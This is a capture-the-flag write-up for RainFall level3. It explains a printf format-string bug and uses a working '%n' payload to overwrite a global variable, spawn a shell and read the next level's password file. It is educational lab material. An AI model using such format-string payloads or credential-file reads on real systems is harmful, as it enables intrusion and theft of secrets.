We see that main call a function v and that we have to find the right conditions to set the variable m to 0x40 to activate a shell.

`fgets()` mitigates the problem we had before with `gets()` by specifying the maximum string length.
The function `printf()` fetches the arguments from the stack. Unless the stack is marked with a
boundary, `printf()` does not know that it runs out of the arguments that are provided to
it. In a miss-match case, it will fetch some data that do not belong to this function call.
The function maintains an initial stack pointer, so it knows the location of the parameters in the stack.

```
0x080484d5      call printf        ; sym.imp.printf ; int printf(const char *format)
0x080484da      mov eax, dword [m] ; 0x804988c
0x080484df      cmp eax, 0x40      ; 64
```
We can see that the address we want to redirect is `0x804988c` which is the address of the m variable that need to have 64 bytes as a value to pass the cmp.
We can do this with the `%n` : it's a special format specifier which instead of printing something causes `printf()` to load the variable pointed by the corresponding argument with a value equal to the number of characters that have been printed by `printf()` before the occurrence of `%n`.
It expects to meet an address that is why we can't directly act on the variables, trying `%4$n` to aim 4 bytes after.
```
level3@RainFall:~$ (python -c "print '\x8c\x98\x04\x08' + 60 * 'A' + '%4\$n'" && cat) | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
whoami
level4
cat /home/user/level4/.pass
```
